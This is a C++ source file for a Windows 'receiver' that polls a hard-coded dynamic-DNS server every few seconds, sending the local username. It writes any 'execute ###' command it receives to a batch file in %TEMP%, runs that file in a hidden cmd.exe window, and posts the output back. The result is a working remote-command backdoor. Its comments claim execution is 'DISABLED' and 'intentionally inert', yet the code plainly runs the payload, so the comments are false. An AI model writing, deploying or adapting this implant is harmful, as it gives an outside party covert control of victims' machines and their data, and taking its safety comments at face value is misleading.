// receiver.cpp — C++ port of receiver.bat (debugging version)
// Networking wired (WinHTTP). Payload execution remains DISABLED by design.
// Build: g++ -std=c++17 -O2 receiver.cpp -o receiver.exe -lshlwapi -lwinhttp

#include <windows.h>
#include <shlwapi.h>
#include <winhttp.h>
#include <io.h>
#include <fcntl.h>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <fstream>
#include <sstream>
#include <regex>
#include <chrono>
#include <thread>
#include <iomanip>

#pragma comment(lib, "Winhttp.lib")

static std::string URL       = "http://raupe.ddns.net/cdr"; // set "URL=http://raupe.ddns.net/cdr"
static std::string USER;                                    // set "USER=%USERNAME%"
static int         POLL_DELAY = 5;                          // set "POLL_DELAY=5"

// Paths/files (use %TEMP%)
static std::string LOGFILE;
static std::string RESP;
static std::string PAYLOAD;
static std::string OUTFILE;
static std::string SEND_RESULT;

// -------------------------
// Helpers
// -------------------------
static std::string now_ts()
{
    SYSTEMTIME st; GetLocalTime(&st);
    char buf[64];
    std::snprintf(buf, sizeof(buf),
        "%04d-%02d-%02d %02d:%02d:%02d.%03d",
        (int)st.wYear, (int)st.wMonth, (int)st.wDay,
        (int)st.wHour, (int)st.wMinute, (int)st.wSecond, (int)st.wMilliseconds);
    return buf;
}

static void append_line(const std::string& path, const std::string& line)
{
    std::ofstream ofs(path, std::ios::app | std::ios::binary);
    if (!ofs) return;
    ofs << line << "\n";
}

static void log_line(const std::string& msg)
{
    append_line(LOGFILE, "[" + now_ts() + "] " + (msg.empty() ? "[LOG] (empty message)" : msg));
}

static bool file_exists(const std::string& p)
{
    DWORD attr = GetFileAttributesA(p.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES) && !(attr & FILE_ATTRIBUTE_DIRECTORY);
}

static void delete_if_exists(const std::string& p)
{
    if (file_exists(p)) DeleteFileA(p.c_str());
}

static bool write_text(const std::string& p, const std::string& s)
{
    std::ofstream ofs(p, std::ios::binary | std::ios::trunc);
    if (!ofs) return false;
    ofs.write(s.data(), (std::streamsize)s.size());
    return true;
}

static std::string read_text(const std::string& p)
{
    std::ifstream ifs(p, std::ios::binary);
    if (!ifs) return {};
    std::ostringstream ss; ss << ifs.rdbuf();
    return ss.str();
}

static std::string first_line_of(const std::string& p)
{
    std::ifstream ifs(p);
    if (!ifs) return {};
    std::string line;
    std::getline(ifs, line);
    return line;
}

static std::string ltrim_spaces(std::string s)
{
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t')) ++i;
    return s.substr(i);
}

// Replace literal two chars "\n" with actual newline
static void replace_backslash_n_in_file(const std::string& path)
{
    std::string c = read_text(path);
    if (c.empty()) return;
    std::string out; out.reserve(c.size());
    for (size_t i = 0; i < c.size(); )
    {
        if (c[i] == '\\' && (i + 1) < c.size() && c[i + 1] == 'n') {
            out.push_back('\n');
            i += 2;
        } else {
            out.push_back(c[i++]);
        }
    }
    write_text(path, out);
}

// -------------------------
// Minimal URL parser for WinHTTP
// -------------------------
struct ParsedUrl {
    bool   secure = false;
    std::wstring host;
    INTERNET_PORT port = 0;
    std::wstring path; // includes leading '/'
};

static std::wstring to_wide(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring w; w.resize(n);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}

static bool parse_url(const std::string& url, ParsedUrl& out)
{
    size_t scheme_pos = url.find("://");
    if (scheme_pos == std::string::npos) return false;
    std::string scheme = url.substr(0, scheme_pos);
    out.secure = (_stricmp(scheme.c_str(), "https") == 0);

    size_t host_start = scheme_pos + 3;
    size_t path_start = url.find('/', host_start);
    std::string hostport = (path_start == std::string::npos)
                                ? url.substr(host_start)
                                : url.substr(host_start, path_start - host_start);
    std::string path = (path_start == std::string::npos)
                                ? "/"
                                : url.substr(path_start);

    std::string host = hostport;
    INTERNET_PORT port = out.secure ? 443 : 80;

    // ipv6 [::1]:port not handled; fine for typical hostnames
    size_t colon = hostport.rfind(':');
    if (colon != std::string::npos && colon > 0 && hostport.find(']') == std::string::npos) {
        host = hostport.substr(0, colon);
        std::string pstr = hostport.substr(colon + 1);
        unsigned long p = std::strtoul(pstr.c_str(), nullptr, 10);
        if (p > 0 && p <= 65535) port = (INTERNET_PORT)p;
    }

    out.host = to_wide(host);
    out.port = port;
    out.path = to_wide(path);
    return !out.host.empty() && !out.path.empty();
}

// -------------------------
// WinHTTP POST helper
// -------------------------
static bool http_post(const std::string& url, const std::string& body,
                      std::string& out, DWORD timeout_ms, std::string* err_msg = nullptr)
{
    ParsedUrl pu;
    if (!parse_url(url, pu)) {
        if (err_msg) *err_msg = "Invalid URL";
        return false;
    }

    HINTERNET hSession = WinHttpOpen(L"receiver/1.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { if (err_msg) *err_msg = "WinHttpOpen failed"; return false; }

    WinHttpSetTimeouts(hSession, timeout_ms, timeout_ms, timeout_ms, timeout_ms);

    HINTERNET hConnect = WinHttpConnect(hSession, pu.host.c_str(), pu.port, 0);
    if (!hConnect) {
        if (err_msg) *err_msg = "WinHttpConnect failed";
        WinHttpCloseHandle(hSession);
        return false;
    }

    DWORD flags = pu.secure ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", pu.path.c_str(),
                                            nullptr, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        if (err_msg) *err_msg = "WinHttpOpenRequest failed";
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    static const wchar_t* kHdr = L"Content-Type: text/plain; charset=utf-8\r\n";
    BOOL b = WinHttpSendRequest(hRequest,
                                kHdr, (DWORD)wcslen(kHdr),
                                (LPVOID)body.data(), (DWORD)body.size(),
                                (DWORD)body.size(), 0);
    if (!b) {
        if (err_msg) *err_msg = "WinHttpSendRequest failed";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
        if (err_msg) *err_msg = "WinHttpReceiveResponse failed";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Check HTTP status
    DWORD status = 0, slen = sizeof(status);
    if (!WinHttpQueryHeaders(hRequest,
                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &slen, WINHTTP_NO_HEADER_INDEX)) {
        if (err_msg) *err_msg = "WinHttpQueryHeaders failed";
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    if (status != 200) {
        if (err_msg) *err_msg = "HTTP status " + std::to_string(status);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // Read body
    out.clear();
    for (;;) {
        DWORD avail = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
        if (avail == 0) break;
        std::string buf; buf.resize(avail);
        DWORD read = 0;
        if (!WinHttpReadData(hRequest, &buf[0], avail, &read) || read == 0) break;
        out.append(buf.data(), read);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

// -------------------------
// Main
// -------------------------
int main()
{
    // Resolve %USERNAME%
    if (const char* u = std::getenv("USERNAME")) USER = u; else USER.clear();

    // Resolve %TEMP%
    char tempPath[MAX_PATH] = {0};
    DWORD n = GetTempPathA(MAX_PATH, tempPath);
    if (n == 0 || n > MAX_PATH) {
        GetCurrentDirectoryA(MAX_PATH, tempPath);
        PathAddBackslashA(tempPath);
    }
    std::string TEMP = tempPath;

    // Map batch variables to paths
    LOGFILE      = TEMP + "receiver_log.txt";
    RESP         = TEMP + "rx_resp.txt";
    PAYLOAD      = TEMP + "rx_payload.bat";
    OUTFILE      = TEMP + "rx_out.txt";
    SEND_RESULT  = TEMP + "rx_send_result.txt";

    // Start messages
    log_line("[INFO] Starting receiver.bat (debug version)");
    log_line("[INFO] Log file: " + LOGFILE);
    std::printf("====================================================\n");
    std::printf("[INFO] Starting receiver.bat (debug version)\n");
    std::printf("[INFO] Log file: %s\n", LOGFILE.c_str());
    std::printf("====================================================\n\n");

    // Cleanup
    delete_if_exists(RESP);
    delete_if_exists(PAYLOAD);
    delete_if_exists(OUTFILE);
    delete_if_exists(SEND_RESULT);
    log_line("[INFO] Cleaning temporary files...");
    std::printf("[INFO] Cleaning temporary files...\n");
    log_line("[INFO] Cleanup complete.");
    std::printf("[INFO] Cleanup complete.\n\n");

    // -------------------------
    // Main loop
    // -------------------------
    for (;;)
    {
        log_line("----------------------------------------------------");
        log_line("[INFO] LOOP START (DATE/TIME from system)");
        std::printf("----------------------------------------------------\n");
        std::printf("[INFO] LOOP START (DATE/TIME from system)\n\n");

        // 1) Fetch command from server (POST "USER ### GET")
        {
            std::string body = USER + " ### GET";
            std::string response, err;
            bool ok = http_post(URL, body, response, /*timeout_ms*/10000, &err);
            if (!ok) {
                log_line("[WARN] HTTP request failed: " + err);
                // parity with batch: write error text (or empty) into RESP so it is logged
                write_text(RESP, "");
            } else {
                write_text(RESP, response);
            }
        }

        // 2) Log raw response
        log_line("-----------------------------");
        log_line("[DEBUG] RAW RESPONSE START");
        {
            if (file_exists(RESP)) {
                std::ifstream ifs(RESP);
                std::string line;
                while (std::getline(ifs, line)) {
                    append_line(LOGFILE, line);
                }
            } else {
                append_line(LOGFILE, "[DEBUG] RESP file missing");
            }
        }
        log_line("[DEBUG] RAW RESPONSE END");
        log_line("-----------------------------");

        // --- Check prefix: skip if response starts with "output ###"
        std::string checkline = first_line_of(RESP);

        if (_strnicmp(checkline.c_str(), "output ### ", 11) == 0) {
            std::printf("----------------------------------------------------\n");
            std::printf("[INFO] Skipping execution because of prefix 'output ###'\n");
            std::printf("[DEBUG] Full skipped line: %s\n", checkline.c_str());
            std::printf("----------------------------------------------------\n");
            log_line("----------------------------------------------------");
            log_line("[INFO] Skipping execution because of prefix 'output ###'");
            log_line(std::string("[DEBUG] Full skipped line: ") + checkline);
            log_line("----------------------------------------------------");
            std::this_thread::sleep_for(std::chrono::seconds(POLL_DELAY));
            continue;
        }

        if (_strnicmp(checkline.c_str(), "cd ###", 6) == 0) {
            std::printf("----------------------------------------------------\n");
            std::printf("[INFO] Executing cd command\n");
            std::printf("----------------------------------------------------\n");
            log_line("----------------------------------------------------");
            log_line("[INFO] Executing cd command");
            log_line("----------------------------------------------------");

            std::string stripped = ltrim_spaces(checkline.substr(6));
            // Actually change directory
            if (!SetCurrentDirectoryA(stripped.c_str())) {
                std::printf("[ERROR] Could not change directory to \"%s\"\n", stripped.c_str());
                log_line(std::string("[ERROR] Could not change directory to ") + stripped);
            } else {
                char buf[MAX_PATH]; GetCurrentDirectoryA(MAX_PATH, buf);
                std::printf("[INFO] Changed directory to: \"%s\"\n", stripped.c_str());
                log_line(std::string("[INFO] Changed directory to: ") + stripped);
            }
        }

        std::printf("[INFO] Received response (logged). See %s for raw response.\n\n", LOGFILE.c_str());

        // 3) Extract payload and write safe payload file (literal)
        {
            std::string text = read_text(RESP);
            bool wrote = false;
            try {
                std::smatch m;
                // Use [\s\S]* to emulate (?s) "dotall"
                std::regex re_exec(R"(execute ### ([\s\S]*))", std::regex_constants::ECMAScript);
                std::regex re_cd(R"(cd ###([\s\S]*))", std::regex_constants::ECMAScript);

                if (std::regex_search(text, m, re_exec)) {
                    std::string cmd = m[1].str();
                    wrote = write_text(PAYLOAD, std::string("@echo off\r\n") + cmd);
                } else if (std::regex_search(text, m, re_cd)) {
                    (void)m;
                    wrote = write_text(PAYLOAD, "@echo off\r\ncd");
                } else {
                    wrote = write_text(PAYLOAD, "@echo off\r\necho __NO_PAYLOAD__");
                }
            } catch (...) {
                wrote = write_text(PAYLOAD, "@echo off\r\necho __ERROR_PARSING_RESPONSE__");
            }

            // Replace literal "\n" with newline (parity with PowerShell replace)
            replace_backslash_n_in_file(PAYLOAD);

            if (!wrote || !file_exists(PAYLOAD)) {
                log_line("[ERROR] Payload file could not be created.");
                std::printf("[ERROR] Payload file could not be created.\n");
                std::this_thread::sleep_for(std::chrono::seconds(POLL_DELAY));
                continue;
            }
        }

        // 4) Log payload content
        log_line("-----------------------------");
        log_line(std::string("[DEBUG] PAYLOAD FILE CONTENT START (") + PAYLOAD + ")");
        {
            std::ifstream ifs(PAYLOAD);
            std::string line;
            while (std::getline(ifs, line)) append_line(LOGFILE, line);
        }
        log_line("[DEBUG] PAYLOAD FILE CONTENT END");
        log_line("-----------------------------");

        std::printf("[INFO] Payload written and logged. Preview:\n");
        {
            std::ifstream ifs(PAYLOAD);
            std::string ln;
            while (std::getline(ifs, ln)) std::printf("%s\n", ln.c_str());
        }
        std::printf("\n");

        STARTUPINFOW si{};
        PROCESS_INFORMATION pi{};
        si.cb = sizeof(si);

        // 5) Execute payload 

        int RC = -1;

        SECURITY_ATTRIBUTES sa{};
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = nullptr;
        sa.bInheritHandle = TRUE;

        std::wstring wOut = std::wstring(OUTFILE.begin(), OUTFILE.end());
        HANDLE hFile = CreateFileW(
            wOut.c_str(),
            GENERIC_WRITE,
            FILE_SHARE_READ,
            &sa,                 // IMPORTANT: inheritable handle
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            nullptr);

        if (hFile == INVALID_HANDLE_VALUE) {
            log_line("[ERROR] Cannot open OUTFILE for writing: " + std::to_string(GetLastError()));
        } else {
            // Setup STARTUPINFO with std handles
            STARTUPINFOW si{};
            PROCESS_INFORMATION pi{};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = hFile;
            si.hStdError  = hFile;
            // Provide a harmless stdin handle (batch doesn't redirect stdin; use NUL)
            HANDLE hNull = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            si.hStdInput = (hNull != INVALID_HANDLE_VALUE) ? hNull : GetStdHandle(STD_INPUT_HANDLE);

            // Build mutable wide command line: cmd.exe /D /S /C "<payload>"
            std::wstring wPayload = std::wstring(PAYLOAD.begin(), PAYLOAD.end());
            std::wstring cmd = L"cmd.exe /D /S /C \"";
            // Escape any internal quotes in payload path
            for (wchar_t ch : wPayload) { if (ch == L'"') cmd.push_back(L'\\'); cmd.push_back(ch); }
            cmd += L"\"";

            // Create the process and wait
            BOOL ok = CreateProcessW(
                nullptr,
                &cmd[0],            // modifiable buffer required by CreateProcess
                nullptr, nullptr,
                TRUE,               // inherit handles
                CREATE_NO_WINDOW,
                nullptr, nullptr,
                &si, &pi);

            DWORD rc = (DWORD)-1;
            if (ok) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                GetExitCodeProcess(pi.hProcess, &rc);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            } else {
                log_line("[ERROR] CreateProcessW failed: " + std::to_string(GetLastError()));
            }

            // cleanup
            CloseHandle(hFile);
            if (hNull != INVALID_HANDLE_VALUE) CloseHandle(hNull);

            RC = (int)rc;
        }

        // EXECUTION DISABLED — this is intentionally inert.
        if (!file_exists(OUTFILE)) {
            write_text(OUTFILE, "[ERROR] No output file created by payload execution. ExitCode=" + std::to_string(RC));
            log_line("[WARN] No %OUT% created; wrote fallback message (ExitCode=" + std::to_string(RC) + ").");
        } else {
            WIN32_FILE_ATTRIBUTE_DATA fad{};
            if (GetFileAttributesExA(OUTFILE.c_str(), GetFileExInfoStandard, &fad)) {
                if (fad.nFileSizeLow == 0 && fad.nFileSizeHigh == 0) {
                    append_line(OUTFILE, std::string("[INFO] Payload executed but produced no output. ExitCode=") + std::to_string(RC) + ".");
                    log_line("[INFO] %OUT% existed but was empty; appended notice (ExitCode=" + std::to_string(RC) + ").");
                }
            }
        }

        log_line(std::string("[INFO] Payload execution finished (exit code ") + std::to_string(RC) + ").");
        std::printf("[INFO] Execution finished (exit code %d).\n", RC);

        // 7) Log the full payload output
        log_line("-----------------------------");
        log_line(std::string("[DEBUG] PAYLOAD OUTPUT START (") + OUTFILE + ")");
        if (file_exists(OUTFILE)) {
            std::ifstream ifs(OUTFILE);
            std::string line;
            while (std::getline(ifs, line)) append_line(LOGFILE, line);
        } else {
            append_line(LOGFILE, "[DEBUG] OUT file missing");
        }
        log_line("[DEBUG] PAYLOAD OUTPUT END");
        log_line("-----------------------------");

        std::printf("[INFO] Payload output logged. See %s.\n\n", LOGFILE.c_str());

        // 8) Send the output back to server (POST "USER ### output ### {content}")
        {
            std::string out = read_text(OUTFILE);
            if (out.empty()) out = "__NO_OUTPUT__";
            std::string body = USER + " ### " + std::string("output ### ") + out;

            std::string resp, err;
            bool ok = http_post(URL, body, resp, /*timeout_ms*/15000, &err);
            if (ok) {
                write_text(SEND_RESULT, "OK");
                log_line(std::string("[INFO] Results send back: OK"));
                std::printf("[INFO] Results successfully sent. (OK)\n");
            } else {
                write_text(SEND_RESULT, std::string("ERR: ") + err);
                log_line(std::string("[INFO] Results send back: ERR: ") + err);
                std::printf("[INFO] Results send failed. (ERR: %s)\n", err.c_str());
            }
        }

        std::printf("\n");
        log_line(std::string("[INFO] Waiting ") + std::to_string(POLL_DELAY) + "s before next check...");
        std::printf("[INFO] Waiting %ds before next check...\n", POLL_DELAY);
        std::this_thread::sleep_for(std::chrono::seconds(POLL_DELAY));
    }

    return 0;
}
